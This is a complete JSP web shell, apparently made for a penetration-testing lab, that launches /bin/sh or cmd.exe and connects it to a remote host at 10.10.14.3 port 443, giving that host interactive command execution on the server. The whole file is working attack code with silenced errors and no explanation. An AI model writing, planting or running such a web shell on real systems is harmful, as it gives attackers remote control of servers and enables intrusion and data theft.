<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream z6;
    OutputStream f3;

    StreamConnector( InputStream z6, OutputStream f3 )
    {
      this.z6 = z6;
      this.f3 = f3;
    }

    public void run()
    {
      BufferedReader zj  = null;
      BufferedWriter ztf = null;
      try
      {
        zj  = new BufferedReader( new InputStreamReader( this.z6 ) );
        ztf = new BufferedWriter( new OutputStreamWriter( this.f3 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = zj.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ztf.write( buffer, 0, length );
          ztf.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( zj != null )
          zj.close();
        if( ztf != null )
          ztf.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.3", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
